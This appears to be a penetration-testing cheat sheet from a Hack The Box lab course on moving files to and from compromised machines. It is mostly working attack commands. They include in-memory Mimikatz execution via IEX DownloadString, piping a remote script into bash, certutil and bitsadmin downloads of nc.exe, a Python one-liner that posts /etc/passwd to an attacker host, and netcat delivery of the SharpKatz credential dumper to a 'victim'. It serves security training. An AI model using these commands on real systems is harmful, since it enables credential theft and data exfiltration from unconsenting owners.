| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

# Transfering Files with Code

**Python 2 - Download**

```
zapstiko@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3 - Download**

```
zapstiko@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

```

**PHP Download with File_get_contents()**
```
zapstiko@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

**PHP Download with Fopen()**
```
zapstiko@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**PHP Download a File and Pipe it to Bash**
```
zapstiko@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

```
**Ruby - Download a File**
```
zapstiko@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

**Perl - Download a File**
```
zapstiko@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```


**JavaScript**
```

C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

**VBScript**
```
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

**Upload Operations using Python3**

```
zapstiko@htb[/htb]$ python3 -m uploadserver 

```


**Uploading a File Using a Python One-liner**
```
zapstiko@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


# Miscellaneous File Transfer Methods

**File Transfer with Netcat and Ncat**
```
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe ( NetCat - Compromised Machine - Listening on Port 8000 )

```
**Netcat - Attack Host - Sending File to Compromised machine**
```
zapstiko@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
zapstiko@htb[/htb]$ # Example using Ncat
zapstiko@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
**Attack Host - Sending File as Input to Netcat**
```
zapstiko@htb[/htb]$ # Example using Original Netcat
zapstiko@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
**Compromised Machine Connect to Netcat to Receive the File**
```
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```
**Attack Host - Sending File as Input to Ncat**
```
zapstiko@htb[/htb]$ # Example using Ncat
zapstiko@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
**Compromised Machine Connect to Ncat to Receive the File**
```
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
**NetCat - Sending File as Input to Netcat**
```
zapstiko@htb[/htb]$ # Example using Ncat
zapstiko@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## PowerShell Session File Transfer


**01. From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**
```
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

**02. From DC01 - Confirm WinRM port TCP 5985 is Open on**

```
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```
**03. Create a PowerShell Remoting Session to DATABASE01**
```
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
**04.Copy DATABASE.txt from DATABASE01 Session to our Localhost**
```
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

**Mounting a Linux Folder Using rdesktop**
```
zapstiko@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
**Mounting a Linux Folder Using xfreerdp**
```
zapstiko@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
